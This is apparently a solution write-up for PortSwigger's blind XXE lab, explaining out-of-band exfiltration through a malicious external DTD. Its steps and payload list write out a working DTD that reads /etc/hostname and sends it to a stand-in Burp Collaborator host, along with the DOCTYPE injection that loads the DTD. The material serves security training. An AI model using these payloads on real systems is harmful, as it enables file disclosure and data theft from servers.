# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

**Lab idea:** This challenge explores blind XXE where the application does not show parsed values. It practices recognizing how an external DTD can be involved in out-of-band disclosure and how to assess externally observable interactions in a controlled lab.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Using Burp Suite Professional, go to the Collaborator tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Place the Burp Collaborator payload into a malicious DTD file: <!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM…
4. Click "Go to exploit server" and save the malicious DTD file on your server.
5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD.
6. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
7. Go back to the Collaborator tab, and click "Poll now".
8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Payloads / key values
- `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
- `stockCheck`
- `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
- `/etc/hostname`

## Official source
- [PortSwigger Academy: Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
